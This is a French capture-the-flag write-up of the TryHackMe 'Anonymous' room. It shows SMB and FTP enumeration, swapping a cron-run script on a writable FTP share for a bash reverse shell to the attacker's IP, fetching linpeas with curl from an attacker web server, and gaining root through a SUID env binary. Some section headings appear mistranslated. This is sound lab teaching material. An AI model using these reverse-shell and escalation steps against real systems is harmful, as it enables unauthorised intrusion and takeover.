---
title: "Procédure pas à pas de la salle anonyme TryHackMe"
date: 2025-10-31 18:00:00 +0100
categories: [Cybersecurity, Capture The Flag, TryHackMe, Writeups]
tags: [TryHackMe, Anonymous Room, SMB Enumeration, FTP Exploitation, Privilege Escalation]
render_with_liquid: false
---

=====================================

Aperçu de la salle -------------

- Difficulté : moyenne
- Domaines d'intervention : énumération SMB, abus FTP, exploitation cron, privilèges SUID
- Objectif : Capturer `user.txt` et `root.txt`

Reconnaissance initiale -------------

J'ai démarré les choses avec une simple analyse de port :

```
nmap -sC -sV [target_IP]
```

Les ports ouverts sont revenus sous les numéros 21, 22, 139 et 445. SSH (`22`) a été fermé en attente d'informations d'identification, donc SMB (`139/445`) et FTP (`21`) sont devenus les points d'entrée évidents.

Énumération PME ---------------

L'accès anonyme SMB a été activé :

```
smbclient -L /[target_IP]/ -N
```

Le partage `pics` autorisait l'accès en lecture. J'ai extrait les fichiers localement mais ce n'étaient que des images inoffensives. Rien à extraire via `strings` ou `steghide`.

Énumération et présence FTP --------------------------

Les connexions FTP anonymes étaient également autorisées :

```
ftp [target_IP]
Name: anonymous
Password: [anything]
```

Dans `/scripts`, j'ai trouvé trois fichiers :

- `to_do.txt` – une petite note faisant allusion aux tâches d'entretien ménager
- `clean.sh` – script bash qui enregistre « rien à supprimer »
- `removed_files.log` – vide, confirmant que le script de nettoyage s'exécute via cron

Étant donné que le partage FTP était accessible en écriture, j'ai remplacé `clean.sh` par une charge utile de shell inversé :

```
#!/bin/bash
bash -i >& /dev/tcp/[My_IP]/1234 0>&1
```

Après avoir téléchargé le script modifié, j'ai démarré un écouteur avec `rlwrap nc -lvn 1234`. Quelques minutes plus tard, la tâche cron s'est exécutée et j'ai attrapé un shell en tant qu'utilisateur du service.

Stabilisation des coques -------------------

J'ai mis à niveau le shell pour améliorer la qualité de vie :

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

De là, j'ai récupéré `user.txt` dans le répertoire personnel.

Élévation de privilèges --------------------

Pour obtenir `linpeas.sh` sur la boîte, j'ai lancé un serveur Web rapide sur mon hôte attaquant avec `python3 -m http.server 8000` et j'ai récupéré le script du shell inversé en utilisant `curl http://[My_IP]:8000/linpeas.sh -o /tmp/linpeas.sh`. Après l'avoir marqué comme exécutable, je l'ai exécuté pour énumérer les chemins d'élévation des privilèges.

La découverte la plus remarquable était un binaire SUID inhabituel, `env`, appartenant à root. `GTFOBins` a confirmé qu'il pouvait être abusé pour écraser des fichiers en tant que root :

```
/usr/bin/env /bin/bash -p
```

Avec le shell racine résultant, j'ai récupéré `root.txt` à partir de `/root`.



